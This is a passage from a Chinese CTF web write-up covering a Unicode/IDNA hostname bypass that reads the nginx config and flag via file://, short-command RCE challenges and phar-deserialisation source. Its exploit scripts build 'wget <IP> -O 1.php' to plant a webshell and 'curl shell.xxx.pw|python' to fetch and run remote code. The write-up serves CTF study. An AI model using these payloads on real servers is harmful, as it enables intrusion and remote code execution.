rel="noopener">https://blog.csdn.net/weixin_41684949/article/details/94619328</a></p><p><strong>4、</strong>python 中 urlparse 模块介绍：<a href="https://www.cnblogs.com/xie-kun/p/7858358.html" target="_blank" rel="noopener">https://www.cnblogs.com/xie-kun/p/7858358.html</a></p><p><strong>5、</strong>blackhat大会ppt  <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p><h2 id="7-1-思路"><a href="#7-1-思路" class="headerlink" title="7.1 思路"></a>7.1 思路</h2><p>1、代码审计</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">&lt;</span>!DOCTYPE html<span class="token operator">></span><span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string">"viewport"</span> content<span class="token operator">=</span><span class="token string">"width=device-width, initial-scale=1.0"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string">"X-UA-Compatible"</span> content<span class="token operator">=</span><span class="token string">"ie=edge"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span>Document<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span>    <span class="token operator">&lt;</span>form method<span class="token operator">=</span><span class="token string">"GET"</span> action<span class="token operator">=</span><span class="token string">"getUrl"</span><span class="token operator">></span>        URL<span class="token punctuation">:</span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"url"</span><span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"submit"</span> value<span class="token operator">=</span><span class="token string">"Submit"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>    <span class="token operator">&lt;</span>code<span class="token operator">></span>        @app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/getUrl'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 111"</span>    parts <span class="token operator">=</span> list<span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#得到域名</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 222 "</span> <span class="token operator">+</span> host    <span class="token comment" spellcheck="true">#上面的两个if语句，分别通过parse.urlparse和parse.urlsplit截取到域名，并进行两次判断</span>    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#域名处以.隔开的各部分进行编码后再解码，此处是破题点</span>    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#综上，对parts的域名部分进行了if判断和编码解码处理。</span>    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#以空格为分隔符，并取第一部分作为finalurl，相当于去掉空格</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 333"</span>    <span class="token operator">&lt;</span><span class="token operator">/</span>code<span class="token operator">></span>    <span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span> Dont worry about the suctf<span class="token punctuation">.</span>cc<span class="token punctuation">.</span> Go on! <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>    <span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span> Do you know the nginx? <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、要清楚nginx重要文件的配置路径：</p><pre><code>配置文件存放目录：/etc/nginx主配置文件：/etc/nginx/conf/nginx.conf管理脚本：/usr/lib64/systemd/system/nginx.service模块：/usr/lisb64/nginx/modules应用程序：/usr/sbin/nginx程序默认存放位置：/usr/share/nginx/html日志默认存放位置：/var/log/nginx/access.log配置文件目录为：/usr/local/nginx/conf/nginx.conf</code></pre><p>3、用unicode编码绕过，fuzz脚本（根据题目源代码改的）如下：</p><p>注意：用python3，导入相应库，改return</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token punctuation">,</span>urlunsplit<span class="token punctuation">,</span>urlsplit<span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> url    <span class="token comment" spellcheck="true">#</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token comment" spellcheck="true">#</span>    parts <span class="token operator">=</span> list<span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token comment" spellcheck="true">#</span>    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token comment" spellcheck="true">#</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65536</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  url <span class="token operator">=</span> <span class="token string">"http://suctf.c{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">try</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> getUrl<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str: "</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"   unicode:  \\u"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">except</span><span class="token punctuation">:</span>      <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用file协议先读nginx配置文件目录，看到flag所在路径，读取flag。</p><pre><code>file://suctf.cＣ/usr/local/nginx/conf/nginx.conffile://suctf.cＣ/usr/fffffflag</code></pre><h1 id="8-easyweb"><a href="#8-easyweb" class="headerlink" title="8. easyweb"></a>8. easyweb</h1><p><strong>链接：</strong><a href="http://203.195.224.127:30008/" target="_blank" rel="noopener">http://203.195.224.127:30008/</a></p><p><strong>考点：</strong>sql注入+文件上传</p><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="http://note.youdao.com/noteshare?id=3bc1b9494dd70bec8900b29e40ea093f&amp;sub=48AFCF72F97E4F18932E8CFD361323E8" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=3bc1b9494dd70bec8900b29e40ea093f&amp;sub=48AFCF72F97E4F18932E8CFD361323E8</a></p><p><strong>2、</strong>[CISCN2019 总决赛 Day2 Web1]Easyweb  <a href="https://www.cnblogs.com/wangtanzhi/p/12253918.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12253918.html</a></p><h1 id="9-rce"><a href="#9-rce" class="headerlink" title="9. rce??"></a>9. rce??</h1><p><strong>链接：</strong><a href="http://203.195.224.127:30009/" target="_blank" rel="noopener">http://203.195.224.127:30009/</a></p><p><strong>考点：</strong></p><p><strong>参考资料：</strong></p><p><strong>1、</strong>命令注入各种骚姿势：</p><p><a href="https://wulidecade.cn/2019/02/17/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%90%84%E7%A7%8D%E9%AA%9A%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">https://wulidecade.cn/2019/02/17/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%90%84%E7%A7%8D%E9%AA%9A%E5%A7%BF%E5%8A%BF/</a></p><p>题目源码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true">#-*- coding: utf-8 -*- </span><span class="token keyword">import</span> requests <span class="token keyword">def</span> <span class="token function">GetShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://203.195.224.127:30009/index.php?1="</span>    fileNames <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"1.php"</span><span class="token punctuation">,</span><span class="token string">"-O\ \\"</span><span class="token punctuation">,</span><span class="token string">"127\ \\"</span><span class="token punctuation">,</span><span class="token string">"224.\\"</span><span class="token punctuation">,</span><span class="token string">"195.\\"</span><span class="token punctuation">,</span><span class="token string">"03.\\"</span><span class="token punctuation">,</span><span class="token string">"\ 2\\"</span><span class="token punctuation">,</span><span class="token string">"wget\\"</span><span class="token punctuation">]</span>     <span class="token comment" spellcheck="true"># linux创建中间有空格的文件名，需要对空格转义</span>    <span class="token comment" spellcheck="true">#wget 203.195.224.127 -O 1.php</span>    <span class="token keyword">for</span> fileName <span class="token keyword">in</span> fileNames<span class="token punctuation">:</span>        createFileUrl <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">">"</span><span class="token operator">+</span>fileName        <span class="token keyword">print</span> createFileUrl         requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>createFileUrl<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#每次命令执行都可以在当前目录下写一个文件。</span>        <span class="token comment" spellcheck="true">#写文件用></span>    getShUrl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"ls -t>1"</span>    <span class="token comment" spellcheck="true">#把所写的所有文件名按时间排序组合在一起，写到文件1里</span>    <span class="token comment" spellcheck="true">#wget 203.195.224.127 -O 1.php</span>    <span class="token comment" spellcheck="true">#访问远程主机，得到一个一句话木马</span>    <span class="token keyword">print</span> getShUrl    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>getShUrl<span class="token punctuation">)</span>    getShellUrl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"sh 1"</span>    <span class="token comment" spellcheck="true">#执行文件1里的内容，首行为1并不影响。</span>    <span class="token keyword">print</span> getShellUrl    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>getShellUrl<span class="token punctuation">)</span>    shellUrl <span class="token operator">=</span> <span class="token string">"http://203.195.224.127:30009/1.php"</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shellUrl<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"[*] Get shell !"</span>    <span class="token keyword">else</span> <span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"[*] fail!"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    GetShell<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="10-rce复仇"><a href="#10-rce复仇" class="headerlink" title="10. rce复仇"></a>10. rce复仇</h1><p><strong>链接：</strong><a href="http://203.195.224.127:30010/" target="_blank" rel="noopener">http://203.195.224.127:30010/</a></p><p><strong>考点：</strong></p><p><strong>参考资料：</strong></p><p><strong>1、</strong>命令注入各种骚姿势</p><p><a href="https://wulidecade.cn/2019/02/17/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%90%84%E7%A7%8D%E9%AA%9A%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">https://wulidecade.cn/2019/02/17/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%90%84%E7%A7%8D%E9%AA%9A%E5%A7%BF%E5%8A%BF/</a></p><p><strong>2、</strong>Hitcon2017 babyfirst-revenge复现  <a href="https://blog.csdn.net/u011377996/article/details/82464383" target="_blank" rel="noopener">https://blog.csdn.net/u011377996/article/details/82464383</a></p><p>思路：</p><p>先写一个ls -t&gt;g到_文件，然后</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">from</span> urllib <span class="token keyword">import</span> quotepayload <span class="token operator">=</span> <span class="token punctuation">[</span>   <span class="token comment" spellcheck="true"># generate `ls -t>g` file</span>    '<span class="token operator">></span><span class="token operator">-</span>t\'    <span class="token string">'>\>g'</span>    '<span class="token operator">></span>l\'    '<span class="token operator">></span>s\ \'    <span class="token string">'ls>a'</span>    <span class="token string">'ls>>a'</span>    <span class="token comment" spellcheck="true">#由前面所述，错误的命令不会影响后面正确语句的正确执行，所以第一行到第三行是错误的命令可忽略，并且第三行a后没有续行符，这不会影响到下一行。从第四行到第七行，由于续行符（\），可以构成如下的命令：</span>   <span class="token comment" spellcheck="true"># generate `curl orange.tw.tw>python`</span>   <span class="token comment" spellcheck="true"># curl shell.xxx.pw|python</span>   <span class="token string">'>on'</span><span class="token punctuation">,</span>    <span class="token string">'>th\\'</span><span class="token punctuation">,</span>    <span class="token string">'>py\\'</span><span class="token punctuation">,</span>   <span class="token string">'>\|\\'</span><span class="token punctuation">,</span>    <span class="token string">'>pw\\'</span><span class="token punctuation">,</span>    <span class="token string">'>x.\\'</span><span class="token punctuation">,</span>   <span class="token string">'>xx\\'</span><span class="token punctuation">,</span>    <span class="token string">'>l.\\'</span><span class="token punctuation">,</span>    <span class="token string">'>el\\'</span><span class="token punctuation">,</span>    <span class="token string">'>sh\\'</span><span class="token punctuation">,</span>    <span class="token string">'>\ \\'</span><span class="token punctuation">,</span>    <span class="token string">'>rl\\'</span><span class="token punctuation">,</span>    <span class="token string">'>cu\\'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true"># exec</span>   <span class="token string">'sh a'</span><span class="token punctuation">,</span>    <span class="token string">'sh g'</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token comment" spellcheck="true"># r = requests.get('http://localhost/tmp/?reset=1')</span><span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>   <span class="token keyword">assert</span> len<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">5</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://localhost/tmp/?cmd='</span> <span class="token operator">+</span> quote<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token punctuation">)</span>   <span class="token keyword">print</span> i   sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="11-SimplePHP"><a href="#11-SimplePHP" class="headerlink" title="11. SimplePHP"></a>11. SimplePHP</h1><p><strong>链接：</strong> <a href="http://47.107.89.184:3333" target="_blank" rel="noopener">http://47.107.89.184:3333</a> </p><p><strong>考点：</strong>phar反序列化</p><p><strong>参考资料：</strong></p><p><strong>1、</strong> 2018SWPUCTF-Web全详解   <a href="https://xz.aliyun.com/t/3656#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/3656#toc-0</a></p><h2 id="11-1-源码"><a href="#11-1-源码" class="headerlink" title="11.1 源码"></a>11.1 源码</h2><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//index.php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">include</span> <span class="token string">'base.php'</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="file-php"><a href="#file-php" class="headerlink" title="file.php"></a>file.php</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token comment" spellcheck="true">//file.php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">include</span> <span class="token string">'function.php'</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string">'class.php'</span><span class="token punctuation">;</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token string">"&lt;h2>There is no file to show!&lt;h2/>"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'file doesn\'t exists.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="function-php"><a href="#function-php" class="headerlink" title="function.php"></a>function.php</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//function.php</span><span class="token comment" spellcheck="true">//show_source(__FILE__); </span><span class="token keyword">include</span> <span class="token string">"base.php"</span><span class="token punctuation">;</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">function</span> <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".jpg"</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//mkdir("upload",0777); </span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token string">'&lt;script type="text/javascript">alert("上传成功!");&lt;/script>'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">upload_file_do</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function">upload_file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">global</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>     <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"gif"</span><span class="token punctuation">,</span><span class="token string">"jpeg"</span><span class="token punctuation">,</span><span class="token string">"jpg"</span><span class="token 